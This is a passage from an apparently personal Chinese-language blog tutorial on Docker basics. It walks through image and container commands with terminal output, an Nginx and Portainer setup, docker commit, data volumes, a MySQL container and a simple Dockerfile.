class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"镜像命令\"><a href=\"#镜像命令\" class=\"headerlink\" title=\"镜像命令\"></a>镜像命令</h4><ol>\n<li>查看 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker images</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>搜索镜像 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker search mysql</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>下载镜像 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker pull mysql:version</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>删除镜像 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker images // 查看image ID</span><br><span class=\"line\"></span><br><span class=\"line\">docker rmi -f feb5d9fea6a5</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">多个删除</span></span><br><span class=\"line\">docker rmi -f feb5d9fea6a5 feb5d9fea6a5 </span><br><span class=\"line\">docker rmi -f $(docker images -aq)    # 删除全部的镜像</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"容器命令\"><a href=\"#容器命令\" class=\"headerlink\" title=\"容器命令\"></a>容器命令</h4><ol>\n<li>新建容器并启动 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run -it centos /bin/bash</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>列出所有运行的容器 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker ps </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">命令参数可选项</span></span><br><span class=\"line\">-a        # 列出当前正在运行的容器+历史运行过的容器</span><br><span class=\"line\">-n=?    # 显示最近创建的容器（可以指定显示几条，比如-n=1）</span><br><span class=\"line\">-q        # 只显示容器的编号</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>退出容器 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">exit        # 容器直接停止，并退出</span><br><span class=\"line\">ctrl+P+Q    # 容器不停止，退出</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>删除容器 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker rm 容器id                    # 删除容器（不能删除正在运行的容器）如果要强制删除：docker rm -f 容器id</span><br><span class=\"line\">docker rm -f $(docker ps -aq)        # 删除全部容器</span><br><span class=\"line\">docker ps -a -q|xargs docker rm        # 删除所有容器</span><br><span class=\"line\">docker rm 656c03b3be05</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"5\">\n<li>启动和停止容器的操作 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker start 容器id # 启动容器</span><br><span class=\"line\">docker restart 容器id # 重启</span><br><span class=\"line\">docker stop 容器id # 停止</span><br><span class=\"line\">docker kill 容器id # 强制停止</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"常用其他命令\"><a href=\"#常用其他命令\" class=\"headerlink\" title=\"常用其他命令\"></a>常用其他命令</h4><ol>\n<li>后台启动容器 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run -d centos</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>查看日志 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker logs -tf 5694d2fc0a88</span><br><span class=\"line\"></span><br><span class=\"line\">docker run -d centos /bin/sh -c \"while true;do echo batype;sleep 1000;done\"</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>查看容器中的进程 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker ps</span><br><span class=\"line\">CONTAINER ID   IMAGE     COMMAND                   CREATED         STATUS         PORTS     NAMES</span><br><span class=\"line\">4f9b77aafa46   centos    \"/bin/sh -c 'while t…\"   6 seconds ago   Up 5 seconds             tender_hofstadter</span><br><span class=\"line\"></span><br><span class=\"line\">docker top 4f9b77aafa46</span><br><span class=\"line\">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class=\"line\">root                14087               14066               0                   17:42               ?                   00:00:00            /bin/sh -c while true;do echo batype;sleep 1000;done</span><br><span class=\"line\">root                14107               14087               0                   17:42               ?                   00:00:00            /usr/bin/coreutils --coreutils-prog-shebang=sleep /usr/bin/sleep 1000</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>查看镜像的元数据 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker inspect 4f9b77aafa46</span><br><span class=\"line\">[</span><br><span class=\"line\">    {</span><br><span class=\"line\">        \"Id\": \"4f9b77aafa469b2e50ca296515d66b841f60f12343b1a45ddbdd09766e103d0f\",</span><br><span class=\"line\">        \"Created\": \"2023-11-03T09:42:35.034147379Z\",</span><br><span class=\"line\">        \"Path\": \"/bin/sh\",</span><br><span class=\"line\">        \"Args\": [</span><br><span class=\"line\">            \"-c\",</span><br><span class=\"line\">            \"while true;do echo batype;sleep 1000;done\"</span><br><span class=\"line\">        ],</span><br><span class=\"line\">        \"State\": {</span><br><span class=\"line\">            \"Status\": \"running\",</span><br><span class=\"line\">            \"Running\": true,</span><br><span class=\"line\">            \"Paused\": false,</span><br><span class=\"line\">            \"Restarting\": false,</span><br><span class=\"line\">            \"OOMKilled\": false,</span><br><span class=\"line\">            \"Dead\": false,</span><br><span class=\"line\">            \"Pid\": 14087,</span><br><span class=\"line\">            \"ExitCode\": 0,</span><br><span class=\"line\">            \"Error\": \"\",</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        }</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    }</span><br><span class=\"line\">    ...</span><br><span class=\"line\">]</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"5\">\n<li>进入当前正在运行的容器 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker exec -it 4f9b77aafa46 /bin/bash</span><br><span class=\"line\">[root@4f9b77aafa46 /]# ps =ef</span><br><span class=\"line\">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class=\"line\">root         1     0  0 09:42 ?        00:00:00 /bin/sh -c while true;do echo batype;sleep 1000;done</span><br><span class=\"line\">root        20     1  0 13:19 ?        00:00:00 /usr/bin/coreutils --coreutils-prog-shebang=sleep /usr/bin/sleep 1000</span><br><span class=\"line\">root        21     0  0 13:30 pts/0    00:00:00 /bin/bash</span><br><span class=\"line\">root        35    21  0 13:31 pts/0    00:00:00 ps -ef</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"6\">\n<li>从容器拷贝文件到主机 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker cp 容器id:容器内路径 目的主机的路径</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# cd /home/</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# ls</span><br><span class=\"line\">html</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# docker ps</span><br><span class=\"line\">CONTAINER ID   IMAGE     COMMAND                  CREATED       STATUS       PORTS     NAMES</span><br><span class=\"line\">4f9b77aafa46   centos    \"/bin/sh -c 'while t…\"   4 hours ago   Up 4 hours             tender_hofstadter</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# docker exec -it 4f9b77aafa46 /bin/bash</span><br><span class=\"line\">[root@4f9b77aafa46 /]# ls</span><br><span class=\"line\">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class=\"line\">[root@4f9b77aafa46 /]# cd /home/</span><br><span class=\"line\">[root@4f9b77aafa46 home]# ls</span><br><span class=\"line\">[root@4f9b77aafa46 home]# touch test.java</span><br><span class=\"line\">[root@4f9b77aafa46 home]# ls</span><br><span class=\"line\">test.java</span><br><span class=\"line\">[root@4f9b77aafa46 home]# exit</span><br><span class=\"line\">exit</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# docker ps</span><br><span class=\"line\">CONTAINER ID   IMAGE     COMMAND                  CREATED       STATUS       PORTS     NAMES</span><br><span class=\"line\">4f9b77aafa46   centos    \"/bin/sh -c 'while t…\"   4 hours ago   Up 4 hours             tender_hofstadter</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# docker cp 4f9b77aafa46:/home/test.java /home</span><br><span class=\"line\">Successfully copied 1.54kB to /home</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# ls</span><br><span class=\"line\">html  test.java</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">拷贝是一个手动过程，未来我们使用 -v 卷的技术，可以实现，自动同步（容器内的/home路径和主机上的/home路径打通）</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"练习安装Nginx\"><a href=\"#练习安装Nginx\" class=\"headerlink\" title=\"练习安装Nginx\"></a>练习安装 Nginx</h4><ol>\n<li><p>搜索镜像：docker search nginx (建议去 dockerHub 上去搜索)</p>\n</li>\n<li><p>下载镜像：docker pull nginx</p>\n</li>\n<li><p>启动镜像</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# docker pull nginx</span><br><span class=\"line\">Using default tag: latest</span><br><span class=\"line\">latest: Pulling from library/nginx</span><br><span class=\"line\">Digest:</span><br><span class=\"line\">sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31</span><br><span class=\"line\">Status: Downloaded newer image for nginx:latest</span><br><span class=\"line\">docker.io/library/nginx:latest</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-d 后台运行</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">--name=<span class=\"string\">\"nginx01\"</span>    给容器命名</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-p 宿主机端口:容器内部端口</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# docker run -d --name nginx01 -p 515:80 nginx</span><br><span class=\"line\">614bbf44138a3e834008f5a33a71194c8e78d7f0e53bccbdfc4c9c9f0c0501cb</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# docker ps</span><br><span class=\"line\">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                 NAMES</span><br><span class=\"line\">614bbf44138a   nginx     \"/docker-entrypoint.…\"   8 seconds ago   Up 7 seconds   0.0.0.0:515-&gt;80/tcp, :::515-&gt;80/tcp   nginx01</span><br><span class=\"line\">4f9b77aafa46   centos    \"/bin/sh -c 'while t…\"   4 hours ago     Up 4 hours                                           tender_hofstadter</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>测试访问 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">访问指向端口515</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ home]# curl 0.0.0.0:515</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">html { color-scheme: light dark; }</span><br><span class=\"line\">body { width: 35em; margin: 0 auto;</span><br><span class=\"line\">font-family: Tahoma, Verdana, Arial, sans-serif; }</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class=\"line\">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class=\"line\">working. Further configuration is required.&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p&gt;For online documentation and support please refer to</span><br><span class=\"line\">&lt;a href=\"http://nginx.org/\"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class=\"line\">Commercial support is available at</span><br><span class=\"line\">&lt;a href=\"http://nginx.com/\"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"可视化工具\"><a href=\"#可视化工具\" class=\"headerlink\" title=\"可视化工具\"></a>可视化工具</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br><span class=\"line\">Unable to find image 'portainer/portainer:latest' locally</span><br><span class=\"line\">latest: Pulling from portainer/portainer</span><br><span class=\"line\"></span><br><span class=\"line\">Digest:</span><br><span class=\"line\">  sha256:fb45b43738646048a0a0cc74fcee2865b69efde857e710126084ee5de9be0f3f</span><br><span class=\"line\">Status: Downloaded newer image for portainer/portainer:latest</span><br><span class=\"line\">a1b1156666edf6cad33eb299e35f543b823673a97a9756726d1fbc2cc571bc47</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker ps</span><br><span class=\"line\">CONTAINER ID   IMAGE                 COMMAND                  CREATED         STATUS         PORTS                                       NAMES</span><br><span class=\"line\">a1b1156666ed   portainer/portainer   \"/portainer\"             8 seconds ago   Up 7 seconds   0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp   dreamy_goodall</span><br><span class=\"line\">614bbf44138a   nginx                 \"/docker-entrypoint.…\"   8 minutes ago   Up 8 minutes   0.0.0.0:515-&gt;80/tcp, :::515-&gt;80/tcp         nginx01</span><br><span class=\"line\">4f9b77aafa46   centos                \"/bin/sh -c 'while t…\"   4 hours ago     Up 4 hours                                                 tender_hofstadter</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>测试访问</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYXR5cGUuY29tOjgwODgv\">http://www.batype.com:8088/<i class=\"fa fa-external-link-alt\"></i></span></p>\n<ol>\n<li><p>连接本地 Local<br><img data-src=\"https://pic.imgdb.cn/item/6545012dc458853aefeef057.jpg\" alt=\"Connect Portainer\"></p>\n</li>\n<li><p>进入之的连接页面<br><img data-src=\"https://pic.imgdb.cn/item/654505fec458853aef03e9b1.jpg\" alt=\"进入之的连接页面\"></p>\n</li>\n</ol>\n<h4 id=\"commit镜像\"><a href=\"#commit镜像\" class=\"headerlink\" title=\"commit镜像\"></a>commit 镜像</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">提交容器成为一个新的副本</span></span><br><span class=\"line\">docker commit</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">命令和git原理类似</span></span><br><span class=\"line\">docker commit -m=\"提交的描述信息\" -a=\"作者\" 容器id 目标镜像名:[TAG]</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker commit -a=\"batype\" -m=\"test\" 614bbf44138a nginx001:18.16.0</span><br><span class=\"line\">sha256:7fcdd59c72c118bccfc2a6d94953e7d18d4a1afadeea0eee304117e917f0aabe</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker images</span><br><span class=\"line\">REPOSITORY            TAG       IMAGE ID       CREATED          SIZE</span><br><span class=\"line\">nginx001              18.16.0   7fcdd59c72c1   12 seconds ago   141MB</span><br><span class=\"line\">nginx                 latest    605c77e624dd   22 months ago    141MB</span><br><span class=\"line\">mysql                 latest    3218b38490ce   22 months ago    516MB</span><br><span class=\"line\">centos                latest    5d0da3dc9764   2 years ago      231MB</span><br><span class=\"line\">portainer/portainer   latest    580c0e4e98b0   2 years ago      79.1MB</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker ps</span><br><span class=\"line\">CONTAINER ID   IMAGE                 COMMAND                  CREATED             STATUS             PORTS                                       NAMES</span><br><span class=\"line\">a1b1156666ed   portainer/portainer   \"/portainer\"             About an hour ago   Up About an hour   0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp   dreamy_goodall</span><br><span class=\"line\">614bbf44138a   nginx                 \"/docker-entrypoint.…\"   About an hour ago   Up About an hour   0.0.0.0:515-&gt;80/tcp, :::515-&gt;80/tcp         nginx01</span><br><span class=\"line\">4f9b77aafa46   centos                \"/bin/sh -c 'while t…\"   5 hours ago         Up 5 hours                                                     tender_hofstadter</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"容器数据卷\"><a href=\"#容器数据卷\" class=\"headerlink\" title=\"容器数据卷\"></a>容器数据卷</h3><h4 id=\"什么是容器数据卷？\"><a href=\"#什么是容器数据卷？\" class=\"headerlink\" title=\"什么是容器数据卷？\"></a>什么是容器数据卷？</h4><p>Docker 容器数据卷，即 Docker Volume（卷）。</p>\n<p>当 Docker 容器运行的时候，会产生一系列的数据文件，这些数据文件会在关闭 Docker 容器时，直接消失的。但是其中产生部分的数据内容，我们是希望能够把它给保存起来，另作它用的。</p>\n<p>关闭 Docker 容器 = 删除内部除了 image 底层数据的其他全部内容，即删库跑路</p>\n<p>所以我们期望：</p>\n<p>将应用与运行的环境打包形成容器运行，伴随着容器运行产生的数据，我们希望这些数据能够持久化。<br>希望容器之间也能够实现数据的共享、</p>\n<p>Docker 容器产生的数据同步到本地，这样关闭容器的时候，数据是在本地的，不会影响数据的安全性。<br>docker 的容器卷技术也就是将容器内部目录和本地目录进行一个同步，即挂载。</p>\n<h4 id=\"使用数据卷\"><a href=\"#使用数据卷\" class=\"headerlink\" title=\"使用数据卷\"></a>使用数据卷</h4><p>主机目录和容器内的目录是映射关系</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -v 主机目录:容器内目录 镜像名 /bin/bash</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">测试，查看容器信息</span></span><br><span class=\"line\">docker inspect 容器id</span><br></pre></td></tr></tbody></table></figure>\n\n<p><img data-src=\"https://pic.imgdb.cn/item/654510aac458853aef35e748.jpg\"></p>\n<p>停止容器后，在主机的 /home/ceshi 文件夹下，修改文件或新增文件，启动容器，查看容器的 /home 文件夹，发现容器内的数据依旧是同步的</p>\n<ul>\n<li>停止容器。</li>\n<li>宿主机上修改文件。</li>\n<li>启动容器。</li>\n<li>容器内的数据依旧是同步的。</li>\n</ul>\n<h4 id=\"安装MySQL\"><a href=\"#安装MySQL\" class=\"headerlink\" title=\"安装MySQL\"></a>安装 MySQL</h4><p><img data-src=\"https://pic.imgdb.cn/item/65451200c458853aef3c1f3c.jpg\"></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取镜像</span></span><br><span class=\"line\">docker pull mysql:5.7</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行容器，需要做数据目录挂载。（安装启动mysql，注意：需要配置密码）</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">官方启动mysql</span></span><br><span class=\"line\">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my123456 -d mysql:5.7</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">配置启动并同步数据</span></span><br><span class=\"line\">docker run -d -p 8081:3306 -v /home/mysql/conf.d:/etc/mysql/conf.d -v /home/mysql/mysql.conf.d:/etc/mysql/mysql.conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=weiliao&amp;666 --name mysql01 mysql:5.7</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n\n<h4 id=\"匿名挂载和具名挂载\"><a href=\"#匿名挂载和具名挂载\" class=\"headerlink\" title=\"匿名挂载和具名挂载\"></a>匿名挂载和具名挂载</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如何确定是具名挂载，还是匿名挂载，还是指定路径挂载</span></span><br><span class=\"line\">-v 容器内的路径                # 匿名挂载</span><br><span class=\"line\">-v 卷名:容器内的路径        # 具名挂载</span><br><span class=\"line\">-v /宿主机路径:容器内路径    # 指定路径挂载</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">具名挂载</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ mysql]# docker run -d -p 3344:80 --name nginx02 -v juming-nginx:/etc/nginx nginx</span><br><span class=\"line\">7cd90c3b2f02f9b84e0dd659f0c8179d777b3c9b6c95e11da4db8a7831d0923e</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ mysql]# docker volume ls</span><br><span class=\"line\">DRIVER    VOLUME NAME</span><br><span class=\"line\">local     cffb5d0a4839c2deff3d4c3fde9b86795632dd3ee42e256daf68fa3a33d888fd</span><br><span class=\"line\">local     f9515933a80fac5357c7b26742d5870471ae5b21dcef34a79b60e2cc70a4c288</span><br><span class=\"line\">local     juming-nginx</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">匿名挂载</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ mysql]# docker run -d --name nginx03 -v /etc/nginx nginx</span><br><span class=\"line\">c27103b64da61544a65037ae16441f2b1ffe6f02ce0729768724752d8c4751f1</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ mysql]# docker volume ls</span><br><span class=\"line\">DRIVER    VOLUME NAME</span><br><span class=\"line\">local     3303ec682317c64c023983cc615fa0db5cd6a88b77c4f7361d2594bc68618961</span><br><span class=\"line\">local     cffb5d0a4839c2deff3d4c3fde9b86795632dd3ee42e256daf68fa3a33d888fd</span><br><span class=\"line\">local     f9515933a80fac5357c7b26742d5870471ae5b21dcef34a79b60e2cc70a4c288</span><br><span class=\"line\">local     juming-nginx</span><br></pre></td></tr></tbody></table></figure>\n<p><strong>拓展</strong></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过 -v 容器内的路径:ro    rw    改变读写权限</span></span><br><span class=\"line\">ro    read only    # 只读</span><br><span class=\"line\">rw    read write    # 可读可写</span><br><span class=\"line\">docker run -d -p 3345:80 --name nginx02 -v juming-nginx:/etc/nginx:rw nginx</span><br><span class=\"line\">docker run -d -p 3345:80 --name nginx02 -v juming-nginx:/etc/nginx:rw nginx</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"Dockerfile\"><a href=\"#Dockerfile\" class=\"headerlink\" title=\"Dockerfile\"></a>Dockerfile</h4><p>dockerfile 就是用来构建 docker 镜像的构建文件。    命令脚本！</p>\n<p>通过这个脚本可以生成镜像，镜像是一层一层的，脚本一个一个的命令，每个命令都是一层！</p>\n<ol>\n<li>创建一个名为 dockerfile 的文件 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">FROM centos</span><br><span class=\"line\">VOLUME [\"volume01\", \"volume02\"]</span><br><span class=\"line\">CMD echo \"-----end-----\"</span><br><span class=\"line\">CMD /bin/bash</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>编译 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker build -f ./dockerfile_songs_note -t songs_note.centos:1.0 .</span><br></pre></td></tr></tbody></table></figure>\n\n<p><img data-src=\"https://pic.imgdb.cn/item/6545ab56c458853aef9204f3.jpg\"></p>\n<ol start=\"3\">\n<li>启动容器 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run -it 5f6352c38230 /bin/bash</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">图形选中的就是匿名挂载</span></span><br><span class=\"line\">VOLUME [\"volume01\", \"volume02\"]</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p><img data-src=\"https://pic.imgdb.cn/item/6545ac56c458853aef949ef9.jpg\"></p>\n<ol start=\"4\">\n<li>查看一下卷挂载的路径：docker inspect 容器 id</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker inspect 95ab48f7bf47</span><br></pre></td></tr></tbody></table></figure>\n\n<p><img data-src=\"https://pic.imgdb.cn/item/6545ad0ac458853aef967f53.jpg\"></p>\n<h4 id=\"数据卷容器\"><a href=\"#数据卷容器\" class=\"headerlink\" title=\"数据卷容器\"></a>数据卷容器</h4><p>多个容器同步数据（临时认父）</p>\n<p>将两个容器或者更多容器之间的数据进行数据共享</p>\n<ol>\n<li>启动 3 个容器 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -d --name docker01 songs_note.centos:1.0</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入容器创建test.js 文件</span></span><br><span class=\"line\">docker run -it -d --name docker02 --volumes-from docker01 songs_note.centos:1.0</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入容器创建test1.js 文件</span></span><br><span class=\"line\">docker run -it -d --name docker03 --volumes-from docker01 songs_note.centos:1.0</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入容器创建test2.js 文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入 容器docker01查看</span></span><br><span class=\"line\">[root@ab2fb91dd8c5 volume01]# ls</span><br><span class=\"line\">test.js  test1.js  test2.js</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">删除某一个容器</span></span><br><span class=\"line\"> [root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker rm -f f0305bd4a916</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看其他容器文件是否还在</span></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker exec -it 1c7a3dbaf54e /bin/bash</span><br><span class=\"line\">[root@1c7a3dbaf54e /]# cd volume01</span><br><span class=\"line\">[root@1c7a3dbaf54e volume01]# ls</span><br><span class=\"line\">test.js  test1.js  test2.js</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>多个 mysql 实现数据共享 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker run -d -p 7777:3306 -v /home/mysql/conf:/etc mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class=\"line\">[root@iZ2vc7kou0oyoo6bt2y0lcZ ~]# docker run -d -p 7777:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql:5.7</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>结论</strong>：<br>容器之间配置信息的传递，数据卷容器的生命同期一直持续到没有容器使用为止。<br>但是一旦你持久化到了本地，这个时候，本地的数据是不会删除的！</p>\n<h3 id=\"DockerFile\"><a href=\"#DockerFile\" 